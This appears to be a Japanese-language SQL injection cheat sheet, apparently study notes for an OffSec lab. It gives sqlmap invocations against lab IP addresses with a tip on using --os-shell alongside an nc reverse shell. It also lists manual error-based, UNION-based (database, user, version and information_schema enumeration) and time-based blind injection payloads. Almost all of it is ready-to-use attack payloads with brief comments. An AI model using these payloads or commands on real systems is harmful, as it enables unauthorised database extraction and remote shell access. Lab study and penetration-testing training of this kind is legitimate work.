## 自動
### sqlmap
```sh
# パラメータを指定してテスト
sqlmap -u http://192.168.154.48/index.php?id=1 -p id --dbs --batch

# burpなどで保存したリクエストに対してテスト
sqlmap -r r.txt --dbs --batch
# --string, --not-stringオプションで成功・失敗の文字列定義が可能
# --threads=10で多少テストが早くなる
# SQLi脆弱性の種類（タイムベースのものなど）によって出力のたびに時間がかかるので--os-shellオプションを指定する場合、ncなどでリバースシェルを取り直したほうがスムーズ
```

## 手動
### エラーベース
```
' or 1=1 -- // 

' or 1=1 in (select @@version) -- // 

```

### UNIONベース
```
# 列数の確認（エラーがでるまで列数を増やす）
' order by 1 -- // 
# Unknown column '6' in 'order clause'

# 1列目はIDフィールドに予約されているのでnullにする
%' UNION SELECT null, null, database(), user(), @@version -- // 

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
### ブラインド
```
# userにoffsecが存在したら3秒スリープ
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```